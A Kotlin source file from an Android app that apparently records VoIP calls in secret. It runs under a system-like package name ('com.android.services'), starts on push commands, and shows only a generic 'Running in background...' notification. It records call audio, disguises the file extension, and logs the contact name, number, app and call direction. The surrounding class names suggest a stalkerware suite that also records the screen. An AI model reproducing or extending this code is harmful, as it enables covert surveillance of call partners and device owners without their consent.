package com.android.services.services.voip

import android.annotation.SuppressLint
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.services.R
import com.android.services.db.entities.VoipCall
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.screenRecord.ScreenRecordCommandProcessingBaseI
import com.android.services.util.*
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.Config.RETURN_CODE_CANCEL
import com.arthenica.mobileffmpeg.Config.RETURN_CODE_SUCCESS
import com.arthenica.mobileffmpeg.FFmpeg
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.*
import org.greenrobot.eventbus.EventBus
import java.io.*
import java.util.concurrent.TimeUnit


class VoipCallCommandProcessingBaseImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : VoipCallCommandProcessingBaseI(service.applicationContext) {

    @SuppressLint("UnspecifiedImmutableFlag")
    override fun initialize() {
        logVerbose("In OnCreate", AppConstants.VOIP_CALL_TYPE)
        AppUtils.appendLog(service.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} In OnCreate")
        voipCallStatus = FcmPushStatus.INITIALIZED.getStatus()
        startAndCreateNotifications()
    }

    private fun startAndCreateNotifications() {
        try {
            val notificationIntent =
                Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                service.applicationContext,
                ScreenRecordCommandProcessingBaseI.SCREEN_RECORD_NOTIFICATION_ID,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
            val notification =
                NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                    .setContentText("Running in background...")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentIntent(pendingIntent!!)
                    .build()
            service.startForeground(
                VOIP_CALL_RECORD_NOTIFICATION_ID,
                notification
            )
        } catch (exp: Exception) {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} onCreate Error: ${exp.message}")
            AppUtils.appendLog(service.applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} onCreate Error: ${exp.message}")
            updateVoipCallPushAsCorrupted()
        }
    }

    override fun parseIntent(intent: Intent?) {
        intent?.let {
            acquireWakeLock()
            logVerbose(
                "${AppConstants.VOIP_CALL_TYPE} In OnStartCommand -> Ready to start VoipCall Recording"
            )
            AppUtils.appendLog(service.applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} In OnStartCommand -> Ready to start VoipCall Recording")
            voipCallRecord = it.getParcelableExtra(VOIP_CALL_RECORD)
            logVerbose("VoipCall Push = $voipCallRecord", AppConstants.VOIP_CALL_TYPE)
            AppUtils.appendLog(service.applicationContext,
                "VoipCall Push = $voipCallRecord")
            voipCallRecord?.let { _ ->
                intervalConsumed = 0
                executorService.execute {
                    startTimerObserver()
                    startRecording()
                }
            } ?: kotlin.run {
                AppUtils.appendLog(service.applicationContext,
                    "VoipCall Push is Null -> Stopping Service")
                logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipCall Push is Null -> Stopping Service")
                service.stopSelf()
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Voip Call Intent is Null, Stopping Service")
            AppUtils.appendLog(applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} Voip Call Intent is Null, Stopping Service")
            service.stopSelf()
        }
    }

    private fun startTimerObserver() {
        disposable =
            Observable.interval(INITIAL_DELAY, PERIODIC_INTERVAL, TimeUnit.MILLISECONDS)
                .subscribeOn(Schedulers.single())
                .observeOn(AndroidSchedulers.mainThread())
                .doOnSubscribe { }
                .subscribe {
                    if (!AppUtils.isVOIPModeActive(service)) {
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode In-active -> Stopping Service")
                        service.stopSelf()
                    } else {
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active")
                        AppUtils.appendLog(service.applicationContext,
                            "${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active")
                    }
                }
    }

    override fun createOutputFilePath() {
        randomUniqueId = AppUtils.randomUniqueId
        mFilePath = AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_VOIP_CALL_RECORD,
            System.currentTimeMillis().toString() + "_" + randomUniqueId + ".mp3"
        )
    }

    override fun onServiceDestroy() {
        logVerbose("${AppConstants.VOIP_CALL_TYPE} In OnDestroy -> Releasing Resources")
        AppUtils.appendLog(service.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} In OnDestroy -> Releasing Resources")
        if (voipCallStatus == FcmPushStatus.INITIALIZED.getStatus()) {
            voipCallStatus = FcmPushStatus.SUCCESS.getStatus()
        }
        coroutineScope.launch {
            try {
                stopRecording()
                var destFile: String? = null
                try {
                    destFile = compressOutputFile()
                } catch (e: Exception) {
                    logException("Error compressing file ${e.message}", throwable = e)
                }
                reNameFile(applicationContext, mFilePath, destFile)
                insertVoipCall()
                if (disposable != null && !disposable!!.isDisposed)
                    disposable!!.dispose()
                shutDownExecutorService()
                releaseWakeLock()
                logVerbose(
                    "stopping voip recording service",
                    "CallRecordingInfo"
                )
            } catch (exp: Exception) {
                logException("${AppConstants.VOIP_CALL_TYPE} onDestroy Exception = ${exp.message}")
                AppUtils.appendLog(service.applicationContext,
                    "${AppConstants.VOIP_CALL_TYPE} onDestroy Exception = ${exp.message}")
                updateVoipCallPushAsCorrupted(isOnDestroy = true)
            }
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.VOIP_CALL_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.VIDEO_BUG_TYPE)
                AppUtils.appendLog(service.applicationContext,
                    "${AppConstants.VOIP_CALL_TYPE} Compression destFile Path is Null")
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Compression destFile Path is Null")
            }
//            localDatabaseSource.updateVoipCallCompressionStatus(mFilePath.replace(".mp3", ".mrc"), 1)
        }
    }

    /** This compresses the Output VoipCall File **/
    private suspend fun compressOutputFile(): String? {
        return try{
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val destFile = "compress_${mFilePath.substringAfterLast("/")}"
                    val destFilePath =
                        mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePath")
                    when (val rc =
                        FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $$destFilePath")) {
                        RETURN_CODE_SUCCESS -> {
                            AppUtils.appendLog(
                                service.applicationContext,
                                "${AppConstants.VOIP_CALL_TYPE} Command execution completed successfully."
                            )
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.VOIP_CALL_TYPE
                            )
                            destFilePath
                        }
                        RETURN_CODE_CANCEL -> {
                            AppUtils.appendLog(
                                service.applicationContext,
                                "${AppConstants.VOIP_CALL_TYPE} Command execution cancelled by user."
                            )
                            logVerbose("${AppConstants.VOIP_CALL_TYPE} Command execution cancelled by user.")
                            AppUtils.deleteFile(applicationContext, destFilePath)
                            null
                        }
                        else -> {
                            AppUtils.appendLog(
                                service.applicationContext,
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                )
                            )
                            logVerbose(
                                String.format(
                                    "${AppConstants.VOIP_CALL_TYPE} Command execution failed with rc=%d and the output below.",
                                    rc
                                )
                            )
                            AppUtils.deleteFile(applicationContext, destFilePath)
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else null
        }catch (e:Exception){
            null
        }
    }

    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }

    override fun startRecording() {
        mRecordingStartTime = System.currentTimeMillis()
        val isCallRecording= AppUtils.isServiceRunning(applicationContext,CallRecordWorkerService::class.java.name);
        if(isCallRecording){
            logVerbose(
                "Call Recording already runnging",
                "CallRecordingInfo"
            )
            EventBus.getDefault().post("stopCallRecording")
        }
        logVerbose("Call recording started in VoipCallRecordService", "CallRecordingInfo")
        try {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Start Recording")
            recorder = Mp3LameRecorder(mFilePath, 44100)
            recorder!!.startRecording(Mp3LameRecorder.TYPE_CALL_RECORD)
        } catch (exp: Exception) {
            logException(
                "${AppConstants.VOIP_CALL_TYPE} Start Recording Exception = ${exp.message}",
                throwable = exp
            )
            AppUtils.appendLog(service.applicationContext,
                "Start Recording Exception = ${exp.message}")
            updateVoipCallPushAsCorrupted()
        }
    }

    override fun startCommand() {
        startAndCreateNotifications()
    }

    override suspend fun stopRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Stop Recording")
            AppUtils.appendLog(service.applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} Preparing to Stop Recording")
            try {
                if (recorder != null) {
                    recorder!!.stopRecording()
                    recorder = null
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} Recording Stopped")
                    AppUtils.appendLog(service.applicationContext,
                        "${AppConstants.VOIP_CALL_TYPE} Recording Stopped")
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.VOIP_CALL_TYPE} Stop Recording Exception = ${e.message}",
                    throwable = e
                )
                AppUtils.appendLog(service.applicationContext,
                    "Stop Recording Exception = ${e.message}")
                updateVoipCallPushAsCorrupted()
            }
        }
    }

    private suspend fun insertVoipCall() {
        withContext(Dispatchers.IO) {
            mFilePath = mFilePath.replace(".mp3", ".mrc")
            val currentTimeInMilliSeconds = System.currentTimeMillis()
            val elapsedTime = (currentTimeInMilliSeconds - mRecordingStartTime).toInt() / 1000
            AppUtils.appendLog(service.applicationContext,
                "VoipCall file duration = ($mRecordingStartTime, $elapsedTime)")
            logVerbose(
                "${AppConstants.VOIP_CALL_TYPE} VoipCall file duration = ($mRecordingStartTime, $elapsedTime)"
            )
            if (voipCallStatus == FcmPushStatus.SUCCESS.getStatus() || voipCallStatus == FcmPushStatus.INTERRUPTED.getStatus()) {
                if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
                    val voipCall = VoipCall()
                    voipCall.apply {
                        this.uniqueId = randomUniqueId
                        this.file = mFilePath
                        this.appName = voipCallRecord!!.voipMessenger
                        this.name = voipCallRecord!!.voipName
                        this.callNumber = voipCallRecord!!.voipNumber
                        this.callDirection = voipCallRecord!!.voipDirection
                        this.callType = voipCallRecord!!.voipType
                        this.callDuration = elapsedTime.toString()
                        this.callDateTime = voipCallRecord!!.voipDateTime
                        this.date = AppUtils.getDate(currentTimeInMilliSeconds)
                        this.isCompressed = 1
                        this.status = 0
                    }
                    localDatabaseSource.insertVoipCall(voipCall)
                } else if (voipCallStatus == FcmPushStatus.INITIALIZED.getStatus()) {
                    AppUtils.appendLog(service.applicationContext,
                        "VoipCall $voipCallStatus failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }")
                    logVerbose(
                        "${AppConstants.VOIP_CALL_TYPE} VoipCall $voipCallStatus failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }"
                    )
                } else {
                    AppUtils.appendLog(service.applicationContext,
                        "${AppConstants.VOIP_CALL_TYPE} VoipCall  $voipCallStatus failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }")
                    logVerbose(
                        "${AppConstants.VOIP_CALL_TYPE} VoipCall  $voipCallStatus failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }"
                    )
                }
            } else {
                AppUtils.appendLog(service.applicationContext,
                    "VoipCall failed with status $voipCallStatus")
                logVerbose(
                    "${AppConstants.VOIP_CALL_TYPE} VoipCall failed with status $voipCallStatus"
                )
                return@withContext
            }
        }
    }

    private fun updateVoipCallPushAsCorrupted(isOnDestroy: Boolean = false) {
        logVerbose("${AppConstants.VOIP_CALL_TYPE} voip call failed, deleting file $mFilePath")
        AppUtils.appendLog(service.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} voip call failed, deleting file $mFilePath")
        voipCallStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        if (!isOnDestroy)
            service.stopSelf()
    }

    private fun acquireWakeLock() {
        val pm =
            service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TOS_VOIP_CALL_WORK)
        wakeLock!!.acquire(10 * 60 * 1000L /*10 minutes*/)
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}